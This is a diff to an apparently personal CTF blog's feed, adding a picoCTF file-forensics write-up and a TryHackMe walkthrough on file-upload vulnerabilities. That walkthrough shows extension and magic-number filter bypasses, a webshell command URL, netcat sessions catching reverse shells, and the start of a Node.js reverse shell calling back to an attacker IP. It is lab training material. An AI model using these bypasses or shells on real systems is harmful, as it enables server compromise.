@@ -11,6 +11,47 @@
     <lastBuildDate>Sun, 07 Jul 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>[picoCTF] Secret of the Polyglot</title>
+      <link>http://localhost:1313/picoctf-secret-of-the-polyglot/</link>
+      <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/picoctf-secret-of-the-polyglot/</guid>
+      <description>Author: SYREAL
+Description The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&amp;rsquo;re getting conflicting information on what type of file it is. They&amp;rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file? Download the suspicious file.
+First, I downloaded the provided file on my Kali Linux VM by the follwing command: wget https://artifacts.</description>
+      <content:encoded><![CDATA[<p><em>Author: SYREAL</em></p>
+<h3 id="description">Description</h3>
+<p>The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&rsquo;re getting conflicting information on what type of file it is. They&rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file?
+Download the suspicious file.</p>
+<hr>
+<p>First, I downloaded the provided file on my Kali Linux VM by the follwing command:
+<code>wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf</code></p>
+<p>The name of the file is <code>flag2of2-final.pdf</code></p>
+<p>I opened the file and it didn&rsquo;t have much information except some random strings, <code>1n_pn9_&amp;_pdf_7f9bccd1}</code></p>
+<p><img src="image.png#center" alt="alt text"></p>
+<br>
+<p>I tried opening the file using the <code>nano</code> command in the terminal, hoping to see more information. When opened with nano, the top of the file stated <code>PNG</code> and included some non-human readable text. This made me suspect that the file is not a <code>PDF</code> but a <code>PNG</code> file.</p>
+<p><img src="image-1.png#center" alt="alt text"></p>
+<br>
+<p>The suspicion turned out to be true. The <code>file</code> command is used to determine the type of a file and the file was indeed a .png file.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ file flag2of2-final.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>flag2of2-final.pdf: PNG image data, <span style="color:#fab387">50</span> x 50, 8-bit/color RGBA, non-interlaced</span></span></code></pre></div>
+<br>
+<p>So I created a new file by running the following command:
+<code>cp flag2of2-final.pdf flag2.png</code></p>
+<p>And check out the newly created file! We&rsquo;re really close to the capturing the flag.
+<img src="image-2.png#center" alt="alt text"></p>
+<p>We&rsquo;re missing the rest of the file but notice the name of the original file, <code>flag2of2-final.pdf</code>. The name implies that it is the second part of the flag.</p>
+<p><strong><em>flag</em></strong>: `picoCTF{f1u3n7<em>1n_pn9</em>&amp;_pdf_7f9bccd1}</p>
+]]></content:encoded>
+    </item>
+    <item>
       <title>[picoCTF] Time Machine</title>
       <link>http://localhost:1313/picoctf-time-machine/</link>
       <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
@@ -382,6 +423,247 @@ What is the name of the image file which can be overwritten?</description>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h4 id="bypassing-server-side-filtering-file-extensions">Bypassing Server-Side Filtering: File Extensions</h4>
+<p>What is the flag in <code>/var/www/</code>?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}</code></pre>
+<p>First let&rsquo;s use Gobuster to locate the upload directory name. The directory name turned out to be <code>privacy</code>.
+<img src="image-12.png#center" alt="alt text"></p>
+<br>
+<p>I tried uploading <code>.png</code> file and it was accepted. So I tried uploading the reverse-shell-php file with the name of <code>hello.png.php</code> but it was denied by saying it&rsquo;s an invalid type format. So I tried <code>hello.php5</code> and it was accepted!</p>
+<p><img src="image-15.png#center" alt="alt text">
+<img src="image-13.png#center" alt="alt text"></p>
+<br>
+<p>After the file was uploaded, I navaigated to the <code>/privacy</code>. Before opening up the reverse-shell file, I had run the netcat command thats running on port 1234 to capture and receive the reverse shell connection.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvnp <span style="color:#fab387">1234</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.103.254<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">56504</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux a2b9a5609bd8 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 03:50:14 up  1:26,  <span style="color:#fab387">0</span> users,  load average: 0.03, 0.01, 0.00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h3 id="bypassing-server-side-filtering-magic-numbers">Bypassing Server-Side Filtering: Magic Numbers</h3>
+<p>Head to magic.uploadvulns.thm &ndash; it&rsquo;s time for the last mini-challenge.</p>
+<p>Bypass the magic number filter to upload a shell. Find the location of the uploaded shell and activate it. Your flag is in /var/www/.</p>
+<p>Grab the flag from /var/www/</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}</code></pre>
+<br>
+<p>The website only accepts GIF type files.</p>
+<p><img src="image-21.png#center" alt="alt text"></p>
+<br>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ file shell.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>shell.php: PHP script, ASCII text</span></span></code></pre></div>
+<p>As you can see, our current shell has the type of PHP script. In order to bypass the magic number filtering, we have to add the GIF magic number to the top of our shell.php file.</p>
+<p>GIF has a couple magic numbers but I am going to use <code>47 49 46 38 37 61</code>.</p>
+<p>Let&rsquo;s open up the reverse shell script and add four random characters on the first line. This is just a temporary placeholder so these characters do not matter.</p>
+<p><img src="image-16.png#center" alt="alt text">
+<br></p>
+<p>Let&rsquo;s open up the file in <code>hexeditor</code> now. The first line has value of <code>41 41 41 41</code> which represents the values AAAA we put on the first line of the file. Let&rsquo;s change them to JPEG magic numbers, <code>47 49 46 38 37 61</code></p>
+<p><img src="image-17.png#center" alt="alt text">
+<img src="image-20.png#center" alt="alt text"></p>
+<br>
+<p>If we run the file command again to see the file type, it now says it&rsquo;s GIF type.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ file shell.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>shell.php: GIF image data, version 87a, <span style="color:#fab387">28735</span> x <span style="color:#fab387">28776</span></span></span></code></pre></div>
+<p><img src="image-19.png#center" alt="alt text"></p>
+<br>
+<p>Let&rsquo;s upload the file now and instead of navigating to <code>/graphics</code> (because directory indexing is turned off for this website), we are going to access the shell directly using its URI like the following:</p>
+<p><code>http://magic.uploadvulns.thm/graphics/shell.php?cmd=whoami;</code></p>
+<p>As you could see from the below, I was running the netcat server to capture the reverse shell and eventually got the flag.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvnp <span style="color:#fab387">1234</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.103.254<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">38598</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux 94d79a333b8d 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 04:35:03 up  2:11,  <span style="color:#fab387">0</span> users,  load average: 0.00, 0.02, 0.01
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h3 id="challenge">Challenge</h3>
+<p>For this task, we are given a black-box file upload challenge to complete.</p>
+<p>Head over to jewel.uploadvulns.thm.</p>
+<p>Take what you&rsquo;ve learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/.</p>
+<p>Hack the machine and grab the flag from /var/www/</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}</code></pre>
+<br>
+<p>Using Burpsuite, I captured the request on the website and the backend is running Javascript, as we can see from the <code>X-Powered-By: Express</code>.</p>
+<p><img src="image-24.png#center" alt="alt text"></p>
+<p>Also the static <code>upload.js</code> file shows that the upload only accepts <code>jpg or jpeg</code> file format.</p>
+<p><img src="image-22.png#center" alt="alt text"></p>
+<br>
+<p>Since we found the backend is running javascript, we need the javascript version of rever shell script not the PHP that we&rsquo;ve been using so far.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>(<span style="color:#f38ba8">function</span> () {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>  <span style="color:#f38ba8">var</span> net <span style="color:#89dceb;font-weight:bold">=</span> require(<span style="color:#a6e3a1">&#34;net&#34;</span>),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>    cp <span style="color:#89dceb;font-weight:bold">=</span> require(<span style="color:#a6e3a1">&#34;child_process&#34;</span>),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>    sh <span style="color:#89dceb;font-weight:bold">=</span> cp.spawn(<span style="color:#a6e3a1">&#34;/bin/sh&#34;</span>, []);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  <span style="color:#f38ba8">var</span> client <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#cba6f7">new</span> net.Socket();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>  client.connect(<span style="color:#fab387">8080</span>, <span style="color:#a6e3a1">&#34;10.17.26.64&#34;</span>, <span style="color:#f38ba8">function</span> () {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>    client.pipe(sh.stdin);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    sh.stdout.pipe(client);
